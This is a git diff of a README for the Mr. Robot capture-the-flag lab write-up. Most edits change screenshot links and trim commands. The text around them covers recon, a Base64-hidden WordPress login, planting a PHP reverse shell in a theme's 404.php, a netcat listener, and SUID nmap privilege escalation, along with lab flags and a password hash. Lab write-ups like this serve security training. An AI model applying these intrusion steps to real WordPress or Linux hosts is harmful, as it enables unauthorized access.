@@ -79,7 +79,7 @@ PORT    STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 7.43 seconds
 ```
-
+![mr.robot3](assets/mr.robot/31.png)
 **Gobuster (directory enumeration):**
 
 ```text
@@ -102,7 +102,7 @@ Starting gobuster in directory enumeration mode
 /index.html           (Status: 200) [Size: 1188]
 /index.php            (Status: 301) [--> http://10.10.199.99/]
 ```
-
+![mr.robot3](assets/mr.robot/32.png)
 **Netcat listener & reverse shell (snippet):**
 
 ```text
@@ -117,7 +117,7 @@ daemon
 ```
 
 **Discovery in `/home/robot`:**
-
+![mr.robot3](assets/mr.robot/33.png)
 ```text
 daemon@ip-10-10-199-99:/home/robot$ ls
 key-2-of-3.txt  password.raw-md5
@@ -125,7 +125,7 @@ key-2-of-3.txt  password.raw-md5
 daemon@ip-10-10-199-99:/home/robot$ cat password.raw-md5
 robot:c3fcd3d76192e4007dfb496cca67e13b
 ```
-
+![mr.robot3](assets/mr.robot/34.png)
 **SSH to `robot` & reading key-2:**
 
 ```text
@@ -137,6 +137,7 @@ key-2-of-3.txt  password.raw-md5
 $ cat key-2-of-3.txt
 822c73956184f694993bede3eb39f959
 ```
+![mr.robot3](assets/mr.robot/35.png)
 
 **SUID binaries and nmap interactive escalation:**
 
@@ -159,7 +160,6 @@ root@ip-10-10-199-99:/root# cat key-3-of-3.txt
 
 ## 3. Tools used
 
-![mr.robot4](assets/mr.robot/4.png)
 
 * `nmap` (scanning, interactive used during escalation)
 * `gobuster` (web directory enumeration)
@@ -171,7 +171,7 @@ root@ip-10-10-199-99:/root# cat key-3-of-3.txt
 
 ## 4. Reconnaissance & Enumeration
 
-![mr.robot5](assets/mr.robot/5.png)
+![mr.robot5](assets/mr.robot/3.png)
 
 Summary:
 
@@ -183,7 +183,7 @@ Summary:
 
 ## 5. Web Enumeration & Initial Access
 
-![mr.robot13](assets/mr.robot/13.png)
+![mr.robot13](assets/mr.robot/31.png)
 
 During directory enumeration and while Gobuster was running, I manually inspected several files and found elements that led directly to initial access. Below is a detailed step-by-step account with an image for each step.
 
@@ -199,30 +199,32 @@ I opened `robots.txt` manually and found two important entries:
 ### 5.2 Discovery of `/license` and extracting encoded data
 
 ![mr.robot15](assets/mr.robot/15.png)
+![mr.robot15](assets/mr.robot/151.png)
 
 While Gobuster continued enumerating, a `/license` page was discovered. Inspecting the page source revealed a **Base64-encoded string** hidden in an HTML comment. After decoding it, the string revealed WordPress credentials:
-
+![mr.robot15](assets/mr.robot/152.png)
 ```
 User: Elliot
 Password: ER28-0652
 ```
-
+![mr.robot16](assets/mr.robot/16.png)
 ### 5.3 Using WordPress credentials & editing Theme Editor
 
-![mr.robot16](assets/mr.robot/16.png)
+![mr.robot16](assets/mr.robot/162.png)
 
-I used the extracted credentials to log into the WordPress admin panel. From the admin dashboard I navigated to the **Theme Editor** and modified `404.php` to include a PHP reverse shell payload. Saving that change meant a request that triggered the 404 page would execute the shell.
+I used the extracted credentials to log into the WordPress admin panel. From the admin dashboard I navigated to the 
+![mr.robot15](assets/mr.robot/161.png)
+**Theme Editor** and modified `404.php` to include a PHP reverse shell payload. Saving that change meant a request that triggered the 404 page would execute the shell.
 
 ### 5.4 Catching the reverse shell
 
-![mr.robot17](assets/mr.robot/17.png)
+![mr.robot17](assets/mr.robot/33.png)
 
 On the attacker machine I ran a netcat listener on port **2222** to capture the incoming reverse shell:
 
 ```bash
 nc -lvnp 2222
 ```
-
 The reverse shell connected, and I upgraded the session to a TTY using:
 
 ```bash
@@ -302,10 +304,10 @@ cat /root/key-3-of-3.txt
 
 ```bash
 # Port scan
-nmap -sC -sV -oN nmap_initial 10.10.199.99
+nmap  10.10.199.99
 
 # Directory enumeration
-gobuster dir -u http://10.10.199.99 -w /usr/share/wordlists/dirb/common.txt -t 10
+gobuster dir -u http://10.10.199.99 -w /usr/share/wordlists/dirb/common.txt 
 
 # Start listener for reverse shell
 nc -lvnp 2222
@@ -317,7 +319,7 @@ export TERM=xterm
 # Check user home
 cd /home/robot
 ls -la
-cat password.raw-md5
+cat password
 
 # Check SUID binaries
 find / -perm -u=s 2>/dev/null
@@ -331,7 +333,7 @@ nmap --interactive
 
 ## 11. Findings, root cause & risk analysis
 
-![mr.robot11](assets/mr.robot/11.png)
+![mr.robot11](assets/mr.robot/9.png)
 
 **Findings**
 
@@ -350,8 +352,6 @@ nmap --interactive
 ---
 
 ## 12. Remediation recommendations
-
-![mr.robot12](assets/mr.robot/12.png)
 
 1. **Fix privileged binaries**
 
@@ -396,19 +396,6 @@ nmap --interactive
 
 ---
 
-## Repository setup instructions
-
-1. Create an `assets/mr.robot/` folder at repository root and add images referenced in this README (mr.robot1.png ... mr.robot17.png).
-2. Save this file as `README.md` in the repository root.
-3. Commit and push:
-
-   ```bash
-   git add README.md assets/mr.robot/
-   git commit -m "Add Mr.Robot lab report README and screenshots"
-   git push origin main
-   ```
-
----
 
 ## Contact & Attribution
 
